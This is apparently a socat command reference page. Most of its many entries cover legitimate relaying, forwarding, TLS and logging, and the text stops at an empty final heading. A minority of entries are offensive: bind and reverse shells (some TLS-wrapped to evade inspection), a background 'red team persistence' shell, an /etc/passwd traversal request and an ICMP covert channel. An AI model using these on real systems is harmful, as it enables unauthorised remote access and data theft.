# socat

> A bidirectional data relay between almost any two endpoints — sockets, files, pipes, TLS — ideal for port forwarding and stable shells.

- Category: Utilities
- Commands: 150
- Page: https://terminal.rokibulroni.com/tool/utilities/socat
- Homepage: http://www.dest-unreach.org/socat/
- Documentation: http://www.dest-unreach.org/socat/doc/socat.html
- Tags: networking, relay, port forwarding

## Install

- apt: `sudo apt install socat`
- brew: `brew install socat`

## Basic Syntax & Help

### socat -h

```bash
socat -h
```

Displays the basic help summary and command line options.

### socat -V

```bash
socat -V
```

Prints version information and supported features/protocols.


## Basic STDIO

### socat - -

```bash
socat - -
```

Pipes standard input directly to standard output, acting as a simple echo.


## Basic File Operations

### socat - /tmp/testfile.txt

```bash
socat - /tmp/testfile.txt
```

Example:

```bash
echo 'hello' | socat - /tmp/testfile.txt
```

Writes data received from standard input to a specified file.

### socat /tmp/testfile.txt -

```bash
socat /tmp/testfile.txt -
```

Reads data from a specified file and outputs it to standard output.


## Basic TCP Client

### socat - TCP:127.0.0.1:80

```bash
socat - TCP:127.0.0.1:80
```

Connects to a local TCP port 80 and sends stdin/receives stdout.


## Basic TCP Server

### socat TCP-LISTEN:8080 STDOUT

```bash
socat TCP-LISTEN:8080 STDOUT
```

Listens on TCP port 8080 and prints incoming data to stdout (single connection).


## Basic UDP Client

### socat - UDP:127.0.0.1:53

```bash
socat - UDP:127.0.0.1:53
```

Sends data from stdin to a UDP socket on port 53.


## Basic UDP Server

### socat UDP-LISTEN:5353 STDOUT

```bash
socat UDP-LISTEN:5353 STDOUT
```

Listens for UDP packets on port 5353 and prints them to stdout.


## TCP Server (Persistent)

### socat TCP-LISTEN:8080,fork STDOUT

```bash
socat TCP-LISTEN:8080,fork STDOUT
```

Listens on port 8080 and forks a new process for each connection to handle multiple clients.


## TCP Server (Reuse Address)

### socat TCP-LISTEN:8080,reuseaddr STDOUT

```bash
socat TCP-LISTEN:8080,reuseaddr STDOUT
```

Listens on port 8080 and allows immediate reuse of the port after termination.


## Port Forwarding (TCP)

### socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80

```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80
```

Forwards all incoming traffic on local port 8080 to remote IP 192.168.1.50 on port 80.


## Port Forwarding (UDP)

### socat UDP-LISTEN:5353,fork UDP:192.168.1.50:53

```bash
socat UDP-LISTEN:5353,fork UDP:192.168.1.50:53
```

Forwards all incoming UDP traffic on local port 5353 to remote IP 192.168.1.50 on port 53.


## Local Port Binding

### socat TCP:192.168.1.50:80,bind=192.168.1.10 -

```bash
socat TCP:192.168.1.50:80,bind=192.168.1.10 -
```

Connects to a remote server while binding the source traffic to a specific local interface IP.


## Source Port Binding

### socat TCP:192.168.1.50:80,sp=31337 -

```bash
socat TCP:192.168.1.50:80,sp=31337 -
```

Connects to a remote server forcing the source port to be 31337.


## Unix Domain Socket Listen

### socat UNIX-LISTEN:/tmp/mysocket -

```bash
socat UNIX-LISTEN:/tmp/mysocket -
```

Creates a Unix domain socket at /tmp/mysocket and listens for connections.


## Unix Domain Socket Connect

### socat - UNIX-CONNECT:/tmp/mysocket

```bash
socat - UNIX-CONNECT:/tmp/mysocket
```

Connects to an existing Unix domain socket at /tmp/mysocket.


## Unix Datagram Listen

### socat UNIX-RECVFROM:/tmp/udgram.sock -

```bash
socat UNIX-RECVFROM:/tmp/udgram.sock -
```

Creates a Unix datagram socket and receives packets.


## Unix Datagram Send

### socat - UNIX-SENDTO:/tmp/udgram.sock

```bash
socat - UNIX-SENDTO:/tmp/udgram.sock
```

Sends data from stdin to a Unix datagram socket.


## IPv6 TCP Client

### socat - TCP6:[::1]:80

```bash
socat - TCP6:[::1]:80
```

Connects to an IPv6 localhost address on TCP port 80.


## IPv6 TCP Server

### socat TCP6-LISTEN:8080 STDOUT

```bash
socat TCP6-LISTEN:8080 STDOUT
```

Listens on IPv6 port 8080 and prints output to stdout.


## Protocol Bridging (IPv4 to IPv6)

### socat TCP4-LISTEN:8080,fork TCP6:[::1]:80

```bash
socat TCP4-LISTEN:8080,fork TCP6:[::1]:80
```

Listens on IPv4 port 8080 and forwards traffic to an IPv6 address.


## Protocol Bridging (TCP to Unix)

### socat TCP-LISTEN:8080,fork UNIX-CONNECT:/tmp/app.sock

```bash
socat TCP-LISTEN:8080,fork UNIX-CONNECT:/tmp/app.sock
```

Exposes a local Unix domain socket over a TCP port.


## File Transfer (Receiver)

### socat TCP-LISTEN:9999,fork FILE:received_file.txt,create

```bash
socat TCP-LISTEN:9999,fork FILE:received_file.txt,create
```

Listens on port 9999 and writes incoming data to a new file.


## File Transfer (Sender)

### socat FILE:source_file.txt TCP:192.168.1.50:9999

```bash
socat FILE:source_file.txt TCP:192.168.1.50:9999
```

Reads a file and sends its content to a remote TCP port.


## Execution (Simple)

### socat - EXEC:/bin/date

```bash
socat - EXEC:/bin/date
```

Executes the date command and prints the output to stdout.


## Execution (Network)

### socat TCP-LISTEN:8080,fork EXEC:/bin/cat

```bash
socat TCP-LISTEN:8080,fork EXEC:/bin/cat
```

Listens on port 8080 and executes 'cat' for every connection, acting as an echo server.


## System Execution

### socat - SYSTEM:'ls -la'

```bash
socat - SYSTEM:'ls -la'
```

Uses the system() call to execute a shell command line string.


## SSL Client (Unverified)

### socat - OPENSSL:192.168.1.50:443,verify=0

```bash
socat - OPENSSL:192.168.1.50:443,verify=0
```

Connects to an SSL/TLS service without verifying the server certificate.


## SSL Server (Self-Signed)

### socat OPENSSL-LISTEN:4443,cert=server.pem,key=server.key,verify=0 STDOUT

```bash
socat OPENSSL-LISTEN:4443,cert=server.pem,key=server.key,verify=0 STDOUT
```

Listens for SSL connections using a specified certificate and key file.


## SSL Client (Verified)

### socat - OPENSSL:example.com:443,cafile=ca.pem

```bash
socat - OPENSSL:example.com:443,cafile=ca.pem
```

Connects to an SSL service and verifies trust using a specific CA file.


## SSL Server (Require Client Cert)

### socat OPENSSL-LISTEN:4443,cert=server.pem,verify=1,cafile=client_ca.pem -

```bash
socat OPENSSL-LISTEN:4443,cert=server.pem,verify=1,cafile=client_ca.pem -
```

Listens for SSL connections and mandates a valid client certificate.


## Proxy Connect (HTTP)

### socat - PROXY:10.0.0.1:target.com:80,proxyport=3128

```bash
socat - PROXY:10.0.0.1:target.com:80,proxyport=3128
```

Connects to target.com via an HTTP proxy at 10.0.0.1:3128.


## Proxy Connect (SOCKS4)

### socat - SOCKS4:127.0.0.1:target.com:80,socksuser=nobody

```bash
socat - SOCKS4:127.0.0.1:target.com:80,socksuser=nobody
```

Connects to target.com via a local SOCKS4 proxy.


## Proxy Connect (SOCKS5)

### socat - SOCKS5:127.0.0.1:target.com:80

```bash
socat - SOCKS5:127.0.0.1:target.com:80
```

Connects to target.com via a local SOCKS5 proxy.


## Virtual Serial Port

### socat PTY,link=/tmp/ttyV0 PTY,link=/tmp/ttyV1

```bash
socat PTY,link=/tmp/ttyV0 PTY,link=/tmp/ttyV1
```

Creates two connected pseudo-terminals to simulate a serial null-modem cable.


## Serial to TCP

### socat /dev/ttyS0,raw,echo=0 TCP:192.168.1.50:9000

```bash
socat /dev/ttyS0,raw,echo=0 TCP:192.168.1.50:9000
```

Bridges a physical serial port to a TCP connection.


## Command Line History (Readline)

### socat READLINE TCP:127.0.0.1:80

```bash
socat READLINE TCP:127.0.0.1:80
```

Wraps the connection in readline to allow line editing and history on the client side.


## Logging (Verbose)

### socat -d -d TCP-LISTEN:8080 STDOUT

```bash
socat -d -d TCP-LISTEN:8080 STDOUT
```

Runs socat with increased verbosity to show connection lifecycle events.


## Logging (File)

### socat -lf /tmp/socat.log TCP-LISTEN:8080 STDOUT

```bash
socat -lf /tmp/socat.log TCP-LISTEN:8080 STDOUT
```

Redirects socat internal log messages to a specified file.


## Data Dump (Hex)

### socat -x TCP-LISTEN:8080 STDOUT

```bash
socat -x TCP-LISTEN:8080 STDOUT
```

Prints all traffic passing through the connection in hexadecimal format to stderr.


## Bind Shell (Basic)

### socat TCP-LISTEN:4444,fork EXEC:/bin/bash

```bash
socat TCP-LISTEN:4444,fork EXEC:/bin/bash
```

Exposes a bash shell on port 4444 (Unsecure: No TTY).


## Reverse Shell (Basic)

### socat TCP:192.168.1.5:4444 EXEC:/bin/bash

```bash
socat TCP:192.168.1.5:4444 EXEC:/bin/bash
```

Connects to a listener on 192.168.1.5 and provides a bash shell.


## Bind Shell (TTY)

### socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

```bash
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Exposes a fully interactive TTY shell on port 4444 handling signals correctly.


## Reverse Shell (TTY)

### socat TCP:192.168.1.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

```bash
socat TCP:192.168.1.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Connects back to an attacker and provides a fully interactive TTY shell.


## Encrypted Bind Shell

### socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork EXEC:/bin/bash

```bash
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork EXEC:/bin/bash
```

Exposes a bash shell wrapped in SSL encryption to evade basic packet inspection.


## Encrypted Reverse Shell

### socat OPENSSL:192.168.1.5:4444,verify=0 EXEC:/bin/bash

```bash
socat OPENSSL:192.168.1.5:4444,verify=0 EXEC:/bin/bash
```

Connects back to an SSL listener and provides a shell.


## Datagram Forwarding (UDP to TCP)

### socat UDP-LISTEN:514,fork TCP:192.168.1.50:514

```bash
socat UDP-LISTEN:514,fork TCP:192.168.1.50:514
```

Converts UDP Syslog traffic to TCP for reliable transport.


## Abstract Namespace (Linux)

### socat ABSTRACT-LISTEN:mysocket -

```bash
socat ABSTRACT-LISTEN:mysocket -
```

Listens on a Linux abstract namespace socket (no filesystem presence).


## Abstract Namespace Connect

### socat - ABSTRACT-CONNECT:mysocket

```bash
socat - ABSTRACT-CONNECT:mysocket
```

Connects to a Linux abstract namespace socket.


## Multicast Receive

### socat UDP4-RECVFROM:8888,ip-add-membership=224.0.0.1:0.0.0.0 -

```bash
socat UDP4-RECVFROM:8888,ip-add-membership=224.0.0.1:0.0.0.0 -
```

Joins a multicast group 224.0.0.1 and receives packets on port 8888.


## Multicast Send

### socat - UDP4-DATAGRAM:224.0.0.1:8888

```bash
socat - UDP4-DATAGRAM:224.0.0.1:8888
```

Sends UDP datagrams to a multicast address.


## Broadcast Send

### socat - UDP4-DATAGRAM:192.168.1.255:9999,broadcast

```bash
socat - UDP4-DATAGRAM:192.168.1.255:9999,broadcast
```

Sends UDP packets to the broadcast address of the subnet.


## Broadcast Receive

### socat UDP4-RECVFROM:9999,broadcast -

```bash
socat UDP4-RECVFROM:9999,broadcast -
```

Receives broadcast UDP packets on port 9999.


## TCP Wrapper

### socat TCP-LISTEN:8080,fork,tcpwrap=httpd STDOUT

```bash
socat TCP-LISTEN:8080,fork,tcpwrap=httpd STDOUT
```

Listens on port 8080 and checks /etc/hosts.allow/deny using the 'httpd' service name.


## Range Restriction

### socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 STDOUT

```bash
socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 STDOUT
```

Accepts connections only from IP addresses within the 192.168.1.0/24 subnet.


## User Impersonation (Su)

### socat TCP-LISTEN:8080,su=nobody STDOUT

```bash
socat TCP-LISTEN:8080,su=nobody STDOUT
```

Starts as root to bind port 8080, then drops privileges to user 'nobody'.


## Chroot Jail

### socat TCP-LISTEN:8080,chroot=/var/tmp/jail STDOUT

```bash
socat TCP-LISTEN:8080,chroot=/var/tmp/jail STDOUT
```

Restricts the socat process to a specific directory (chroot) after connection.


## Connection Timeout

### socat - TCP:192.168.1.50:80,connect-timeout=5

```bash
socat - TCP:192.168.1.50:80,connect-timeout=5
```

Aborts the connection attempt if the server does not respond within 5 seconds.


## Read Timeout

### socat - TCP:192.168.1.50:80,read-timeout=10

```bash
socat - TCP:192.168.1.50:80,read-timeout=10
```

Closes the connection if no data is received for 10 seconds.


## Total Timeout

### socat -t 20 TCP:192.168.1.50:80 -

```bash
socat -t 20 TCP:192.168.1.50:80 -
```

Terminates the process after 20 seconds of inactivity when one side closes.


## Keepalive Tuning

### socat - TCP:192.168.1.50:80,keepalive,keepidle=60,keepintvl=10,keepcnt=3

```bash
socat - TCP:192.168.1.50:80,keepalive,keepidle=60,keepintvl=10,keepcnt=3
```

Enables TCP keepalives with custom idle time, interval, and failure count.


## Traffic Shaping (MSS)

### socat - TCP:192.168.1.50:80,mss=512

```bash
socat - TCP:192.168.1.50:80,mss=512
```

Forces the Maximum Segment Size to 512 bytes for testing fragmentation or MTU issues.


## Traffic Shaping (TTL)

### socat - TCP:192.168.1.50:80,ttl=1

```bash
socat - TCP:192.168.1.50:80,ttl=1
```

Sets the IP Time To Live to 1, useful for testing network hops.


## Pipe Integration

### socat PIPE:/tmp/mypipe -

```bash
socat PIPE:/tmp/mypipe -
```

Reads from an existing named pipe.


## Open File by Descriptor

### socat FD:3 -

```bash
socat FD:3 -
```

Reads/Writes to file descriptor 3 (useful in shell scripts).


## Quiet Mode

### socat -u TCP:192.168.1.50:80 -

```bash
socat -u TCP:192.168.1.50:80 -
```

Unidirectional mode (left to right only), ignoring reverse traffic.


## Reverse Unidirectional

### socat -U TCP:192.168.1.50:80 -

```bash
socat -U TCP:192.168.1.50:80 -
```

Unidirectional mode (right to left only), useful for download-only streams.


## Ignore EOF

### socat -u FILE:data.txt,ignoreeof TCP:192.168.1.50:9000

```bash
socat -u FILE:data.txt,ignoreeof TCP:192.168.1.50:9000
```

Keeps the socket open even after the input file has been fully read.


## Web Server (Static Response)

### socat TCP-LISTEN:8080,fork SYSTEM:'echo HTTP/1.0 200; echo Content-Type: text/plain; echo; echo Hello'

```bash
socat TCP-LISTEN:8080,fork SYSTEM:'echo HTTP/1.0 200; echo Content-Type: text/plain; echo; echo Hello'
```

A crude HTTP server that returns a static hello message to every visitor.


## Web Server (File Serve)

### socat TCP-LISTEN:8080,fork SYSTEM:'cat header.txt index.html'

```bash
socat TCP-LISTEN:8080,fork SYSTEM:'cat header.txt index.html'
```

Serves a specific HTML file with headers upon connection.


## HTTP Proxy (Man-in-the-Middle)

### socat -v TCP-LISTEN:8080,fork TCP:target.com:80

```bash
socat -v TCP-LISTEN:8080,fork TCP:target.com:80
```

Forwards traffic to target.com and logs HTTP headers to stderr.


## Raw Socket Send

### socat - RAW:192.168.1.50:255

```bash
socat - RAW:192.168.1.50:255
```

Sends raw IP packets (protocol 255) to a destination.


## Interface Binding

### socat - UDP:192.168.1.50:53,bindtodevice=eth0

```bash
socat - UDP:192.168.1.50:53,bindtodevice=eth0
```

Forces the traffic to exit through a specific network interface (eth0).


## TUN Interface Creation

### socat TUN:10.0.0.1/24,tun-type=tun,tun-name=mytun0 -

```bash
socat TUN:10.0.0.1/24,tun-type=tun,tun-name=mytun0 -
```

Creates a virtual TUN interface with IP 10.0.0.1 (requires root).


## TAP Interface Creation

### socat TUN:10.0.0.1/24,tun-type=tap,tun-name=mytap0 -

```bash
socat TUN:10.0.0.1/24,tun-type=tap,tun-name=mytap0 -
```

Creates a virtual TAP (Ethernet) interface.


## SCTP Client

### socat - SCTP:192.168.1.50:80

```bash
socat - SCTP:192.168.1.50:80
```

Connects to a remote SCTP service.


## SCTP Server

### socat SCTP-LISTEN:8080,fork STDOUT

```bash
socat SCTP-LISTEN:8080,fork STDOUT
```

Listens for incoming SCTP connections.


## OpenSSL Certificate Gen (Context)

### openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key

```bash
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key
```

Prerequisite command to generate certificate/key pairs for socat SSL listeners.


## SSL Fingerprinting

### socat -v OPENSSL:192.168.1.50:443,verify=0 /dev/null

```bash
socat -v OPENSSL:192.168.1.50:443,verify=0 /dev/null
```

Connects via SSL and dumps verbose handshake info to stderr to inspect headers.


## DTLS Client (UDP SSL)

### socat - OPENSSL-DTLS-CLIENT:192.168.1.50:4433,verify=0

```bash
socat - OPENSSL-DTLS-CLIENT:192.168.1.50:4433,verify=0
```

Connects to a Datagram TLS (UDP encrypted) service.


## DTLS Server (UDP SSL)

### socat OPENSSL-DTLS-SERVER:4433,cert=server.pem,key=server.key,verify=0 STDOUT

```bash
socat OPENSSL-DTLS-SERVER:4433,cert=server.pem,key=server.key,verify=0 STDOUT
```

Listens for DTLS connections.


## File Descriptor Passing

### socat UNIX-LISTEN:/tmp/pass.sock,fork EXEC:'/bin/cat',fdin=3,fdout=4

```bash
socat UNIX-LISTEN:/tmp/pass.sock,fork EXEC:'/bin/cat',fdin=3,fdout=4
```

Advanced usage for passing specific file descriptors to the executed process.


## GOPEN (Generic Open)

### socat - GOPEN:/tmp/testfile.txt

```bash
socat - GOPEN:/tmp/testfile.txt
```

Opens a file using generic open flags, useful for non-standard file types.


## Directory Traversal Test

### socat - TCP:192.168.1.50:80,crlf

```bash
socat - TCP:192.168.1.50:80,crlf
```

Example:

```bash
echo -e 'GET /../../etc/passwd HTTP/1.0\n\n' | socat - TCP:192.168.1.50:80,crlf
```

Sends payloads with forced CRLF line endings to test web servers.


## SMTP Interaction

### socat - TCP:192.168.1.50:25,crlf

```bash
socat - TCP:192.168.1.50:25,crlf
```

Connects to an SMTP server, automatically converting local LF to network CRLF.


## Banner Grabbing

### socat - OPENSSL:192.168.1.50:443,verify=0,connect-timeout=2

```bash
socat - OPENSSL:192.168.1.50:443,verify=0,connect-timeout=2
```

Quickly connects to an SSL port to grab the service banner and disconnect.


## VM Socket (VSOCK) Connect

### socat - VSOCK-CONNECT:2:1234

```bash
socat - VSOCK-CONNECT:2:1234
```

Connects to a VSOCK (Virtual Machine socket) CID 2 port 1234.


## VM Socket (VSOCK) Listen

### socat VSOCK-LISTEN:1234 STDOUT

```bash
socat VSOCK-LISTEN:1234 STDOUT
```

Listens for VSOCK connections on port 1234.


## Disable Nagle Algorithm

### socat - TCP:192.168.1.50:80,nodelay

```bash
socat - TCP:192.168.1.50:80,nodelay
```

Disables Nagle's algorithm (TCP_NODELAY) for lower latency on small packets.


## Broadcast Relay

### socat UDP4-RECVFROM:9999,broadcast,fork UDP4-DATAGRAM:192.168.2.255:9999,broadcast

```bash
socat UDP4-RECVFROM:9999,broadcast,fork UDP4-DATAGRAM:192.168.2.255:9999,broadcast
```

Relays broadcast traffic from one subnet to another.


## Git Protocol Wrapper

### socat TCP-LISTEN:9418,fork EXEC:'git daemon --inetd --verbose --base-path=/tmp/repo'

```bash
socat TCP-LISTEN:9418,fork EXEC:'git daemon --inetd --verbose --base-path=/tmp/repo'
```

Exposes a local git repository via the Git protocol.


## Rsync Wrapper

### socat TCP-LISTEN:873,fork EXEC:'rsync --daemon --no-detach'

```bash
socat TCP-LISTEN:873,fork EXEC:'rsync --daemon --no-detach'
```

Wraps the rsync daemon in a socat listener.


## Port Knocking Simulation

### socat - UDP:192.168.1.1:7000; socat - UDP:192.168.1.1:8000

```bash
socat - UDP:192.168.1.1:7000; socat - UDP:192.168.1.1:8000
```

Sends a sequence of packets to specific ports to trigger a knock sequence.


## Payload Injection (File)

### socat TCP:192.168.1.50:80 FILE:exploit.bin

```bash
socat TCP:192.168.1.50:80 FILE:exploit.bin
```

Sends the raw binary content of a file directly to a target service.


## Loopback Relay

### socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80

```bash
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
```

Exposes a service bound to localhost only (127.0.0.1) to the external network interface.


## Unix to TCP Bridge

### socat UNIX-LISTEN:/tmp/docker.sock,fork TCP:192.168.1.50:2375

```bash
socat UNIX-LISTEN:/tmp/docker.sock,fork TCP:192.168.1.50:2375
```

Maps a local Docker Unix socket to a remote TCP Docker daemon.


## TCP to Unix Bridge

### socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock

```bash
socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock
```

Exposes the local Docker Unix socket over TCP (Security risk: use with caution).


## Encrypted Forwarder

### socat TCP-LISTEN:8080,fork OPENSSL:example.com:443,verify=0

```bash
socat TCP-LISTEN:8080,fork OPENSSL:example.com:443,verify=0
```

Creates a local plaintext listener that encrypts traffic to a remote SSL server.


## Decrypted Forwarder

### socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:80

```bash
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:80
```

Offloads SSL encryption, forwarding decrypted traffic to a local HTTP server.


## IPv6 Tunnelling over IPv4

### socat TCP4-LISTEN:8080,fork TCP6:[2001:db8::1]:80

```bash
socat TCP4-LISTEN:8080,fork TCP6:[2001:db8::1]:80
```

Bridges IPv4 network traffic to an internal IPv6-only host.


## Multiple Listeners

### socat TCP-LISTEN:8080,fork TCP-LISTEN:8081,fork

```bash
socat TCP-LISTEN:8080,fork TCP-LISTEN:8081,fork
```

Bridges two different listening ports together, connecting clients from port A to clients on port B.


## Log Timestamping

### socat -lf /tmp/log.txt -d -d TCP-LISTEN:8080 STDOUT

```bash
socat -lf /tmp/log.txt -d -d TCP-LISTEN:8080 STDOUT
```

Logs connections with timestamps to a file for auditing.


## Read-Only File System Mount

### socat UNIX-LISTEN:/tmp/readonly.sock,fork EXEC:'ls -la',readonly

```bash
socat UNIX-LISTEN:/tmp/readonly.sock,fork EXEC:'ls -la',readonly
```

Executes a command but prevents it from writing data back to the socket.


## Write-Only Socket

### socat -u - TCP:192.168.1.50:9000

```bash
socat -u - TCP:192.168.1.50:9000
```

Enforces a strict write-only channel to the destination.


## Maximum Children Limit

### socat TCP-LISTEN:8080,fork,max-children=5 STDOUT

```bash
socat TCP-LISTEN:8080,fork,max-children=5 STDOUT
```

Limits the concurrent connections to 5 to prevent resource exhaustion.


## Backlog Queue Tuning

### socat TCP-LISTEN:8080,backlog=128 STDOUT

```bash
socat TCP-LISTEN:8080,backlog=128 STDOUT
```

Sets the listen backlog queue size to 128 connections.


## Set Buffer Size

### socat - TCP:192.168.1.50:80,sndbuf=65536,rcvbuf=65536

```bash
socat - TCP:192.168.1.50:80,sndbuf=65536,rcvbuf=65536
```

Manually adjusts the send and receive buffer sizes.


## Ignore Signals

### socat - TCP:192.168.1.50:80,sighup,sigint

```bash
socat - TCP:192.168.1.50:80,sighup,sigint
```

Configures the process to ignore SIGHUP and SIGINT signals.


## Lock File Protection

### socat TCP-LISTEN:8080,lock=/tmp/socat.lock STDOUT

```bash
socat TCP-LISTEN:8080,lock=/tmp/socat.lock STDOUT
```

Ensures only one instance runs by using a lock file.


## Fuzzing Input (Random)

### socat -u /dev/urandom TCP:192.168.1.50:80

```bash
socat -u /dev/urandom TCP:192.168.1.50:80
```

Streams random garbage data to a target port to test stability.


## Fuzzing Input (Zeroes)

### socat -u /dev/zero TCP:192.168.1.50:80

```bash
socat -u /dev/zero TCP:192.168.1.50:80
```

Streams infinite zero bytes to a target port.


## Blue Team Canary (Web)

### socat TCP-LISTEN:80,fork SYSTEM:'echo "ALERT: Port 80 Access from $SOCAT_PEERADDR" >> /var/log/canary.log; echo HTTP/1.0

```bash
socat TCP-LISTEN:80,fork SYSTEM:'echo "ALERT: Port 80 Access from $SOCAT_PEERADDR" >> /var/log/canary.log; echo HTTP/1.0 200 OK; echo; echo OK'
```

Logs the attacker's IP to a file whenever port 80 is touched.


## Blue Team Canary (SSH)

### socat TCP-LISTEN:22,fork SYSTEM:'echo "ALERT: SSH Probe from $SOCAT_PEERADDR" >> /var/log/canary.log'

```bash
socat TCP-LISTEN:22,fork SYSTEM:'echo "ALERT: SSH Probe from $SOCAT_PEERADDR" >> /var/log/canary.log'
```

Deploys a fake SSH listener that logs any connection attempts.


## Port Scan Detector

### socat TCP-LISTEN:12345,fork SYSTEM:'logger -t SOCAT "Port scan detected from $SOCAT_PEERADDR"'

```bash
socat TCP-LISTEN:12345,fork SYSTEM:'logger -t SOCAT "Port scan detected from $SOCAT_PEERADDR"'
```

Listens on a high port and sends a syslog message if connected to.


## Packet Capture Simulation

### socat -u TCP-LISTEN:8080,fork OPEN:/tmp/capture.pcap,creat,append

```bash
socat -u TCP-LISTEN:8080,fork OPEN:/tmp/capture.pcap,creat,append
```

Captures raw payloads sent to the port and saves them to a file.


## Red Team Persistence

### socat TCP-LISTEN:5555,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

```bash
socat TCP-LISTEN:5555,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Example:

```bash
nohup socat TCP-LISTEN:5555,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
```

Runs a background listener shell that respawns after disconnect.


## Covert Channel (ICMP)

### socat -v PIPE:/tmp/data IP4:192.168.1.50:1

```bash
socat -v PIPE:/tmp/data IP4:192.168.1.50:1
```

Tunnels data over raw ICMP protocol (Ping) traffic.


## Terminator (Timeout)

### socat -T 5 TCP-LISTEN:8080 STDOUT

```bash
socat -T 5 TCP-LISTEN:8080 STDOUT
```

Forces the total connection time to strictly 5 seconds, then kills it.


## Environment Variable Injection

### socat TCP-LISTEN:8080,fork EXEC:'env'

```bash
socat TCP-LISTEN:8080,fork EXEC:'env'
```

Prints the server-side environment variables to the connecting client.


## Transparent Proxy (Linux)

### socat TCP-LISTEN:8080,fork,su=nobody TCP:original-dest:80

```bash
socat TCP-LISTEN:8080,fork,su=nobody TCP:original-dest:80
```

A basic setup often used with iptables redirection for transparent proxying.


## Hex Dump Analysis

### socat -x -v TCP-LISTEN:8080 STDOUT

```bash
socat -x -v TCP-LISTEN:8080 STDOUT
```

Combines verbose logging and hex dumping for deep protocol analysis.


## File Append Mode

### socat -u TCP-LISTEN:8080,fork OPEN:/var/log/aggregator.log,creat,append

```bash
socat -u TCP-LISTEN:8080,fork OPEN:/var/log/aggregator.log,creat,append
```

Aggregates logs from multiple network sources into a single file.


## SOCKS Proxy Chaining

### socat - SOCKS4:127.0.0.1:target:80,socksuser=nobody,socksport=9050

```bash
socat - SOCKS4:127.0.0.1:target:80,socksuser=nobody,socksport=9050
```

Directs traffic through a secondary proxy (e.g., Tor) on port 9050.


## Named Pipe (FIFO) Create

### mkfifo /tmp/fifo; socat - PIPE:/tmp/fifo

```bash
mkfifo /tmp/fifo; socat - PIPE:/tmp/fifo
```

Interacts with a manually created named pipe.


## UDP Multicast Listener (Specific Interface)

### socat UDP4-RECVFROM:8888,ip-add-membership=239.0.0.1:192.168.1.10 -

```bash
socat UDP4-RECVFROM:8888,ip-add-membership=239.0.0.1:192.168.1.10 -
```

Listens for multicast traffic on a specific network interface IP.


## Send to Syslog

### socat - UNIX-SENDTO:/dev/log

```bash
socat - UNIX-SENDTO:/dev/log
```

Example:

```bash
echo '<3>Critical Error' | socat - UNIX-SENDTO:/dev/log
```

Injects a message directly into the local system logging socket.


## Listen on Interface (SO_BINDTODEVICE)

### socat TCP-LISTEN:8080,bindtodevice=eth0 STDOUT

```bash
socat TCP-LISTEN:8080,bindtodevice=eth0 STDOUT
```

Accepts connections only if they arrive on the eth0 interface.


## OpenSSL Cipher Selection

### socat - OPENSSL:192.168.1.50:443,cipher=AES256-SHA

```bash
socat - OPENSSL:192.168.1.50:443,cipher=AES256-SHA
```

Forces the SSL connection to use a specific cipher suite.


## OpenSSL Version Force

### socat - OPENSSL:192.168.1.50:443,method=TLS1.2

```bash
socat - OPENSSL:192.168.1.50:443,method=TLS1.2
```

Forces the usage of TLS 1.2 specifically.


## Shutdown Mode (Write)

### socat - TCP:192.168.1.50:80,shut-down

```bash
socat - TCP:192.168.1.50:80,shut-down
```

Shuts down the writing half of the connection after EOF on stdin.


## Shutdown Mode (Close)

### socat - TCP:192.168.1.50:80,shut-close

```bash
socat - TCP:192.168.1.50:80,shut-close
```

Completely closes the socket after EOF on stdin.


## Interactive Chat Server

### socat TCP-LISTEN:4444,fork READLINE

```bash
socat TCP-LISTEN:4444,fork READLINE
```

Creates a simple chat server where connected clients have line editing capabilities.


## Broadcast Echo Server

### socat UDP4-LISTEN:9999,broadcast,fork EXEC:/bin/cat

```bash
socat UDP4-LISTEN:9999,broadcast,fork EXEC:/bin/cat
```

Replies to broadcast packets by echoing the data back.


## Quick Web Client

### socat - TCP:example.com:80

```bash
socat - TCP:example.com:80
```

Example:

```bash
echo -e 'GET / HTTP/1.0\r\n\r\n' | socat - TCP:example.com:80
```

Performs a manual HTTP GET request.


## Socket Pair (Internal)

### socat -d -d SOCKET-CONNECT:1:2 -

```bash
socat -d -d SOCKET-CONNECT:1:2 -
```

Connects to an already open file descriptor pair (advanced internal piping).


## System Beep (Remote)

### socat UDP-LISTEN:9999,fork SYSTEM:'echo -e "\a"'

```bash
socat UDP-LISTEN:9999,fork SYSTEM:'echo -e "\a"'
```

Triggers the system bell/beep whenever a UDP packet is received.


## Wait for Port

### socat -u TCP:127.0.0.1:8080,retry=10,interval=1 -

```bash
socat -u TCP:127.0.0.1:8080,retry=10,interval=1 -
```

Retries connection to the port 10 times with 1 second intervals until successful.


## File Permission Set

### socat UNIX-LISTEN:/tmp/secure.sock,user=root,group=root,mode=600 -

```bash
socat UNIX-LISTEN:/tmp/secure.sock,user=root,group=root,mode=600 -
```

Creates a Unix socket with strict 600 permissions.


## Listen Limit

### socat TCP-LISTEN:8080,max-connections=1 STDOUT

```bash
socat TCP-LISTEN:8080,max-connections=1 STDOUT
```

Allows only a single active connection at a time.


## UDP Connect (Pseudo)

### socat - UDP-CONNECT:192.168.1.50:53

```bash
socat - UDP-CONNECT:192.168.1.50:53
```

Establishes a 'connected' state for UDP, allowing ICMP error tracking.


## Dual Stack Listen

